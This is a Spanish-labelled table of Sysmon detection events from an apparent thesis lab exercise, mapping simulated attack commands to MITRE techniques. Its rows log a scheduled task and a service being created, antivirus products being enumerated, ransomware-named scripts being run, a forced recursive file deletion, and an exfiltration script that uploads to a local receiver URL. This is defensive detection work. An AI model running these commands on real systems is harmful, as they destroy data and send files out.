Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:51:16.075Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:28.557Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:41.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$target = 'C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\DUMB_LAB'; Write-Host 'TEC008_OK'; Get-ChildItem $target -Recurse -File | ForEach-Object { Remove-Item $_.FullName -Force }; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:48.413Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:06.887Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:41.089Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:12.618Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:27.110Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:55:41.845Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.551Z	P3	TEC-003	T1053.005	TEC-003 Scheduled Task operation	TEC003_ScheduledTask_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC003_ScheduledTask_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
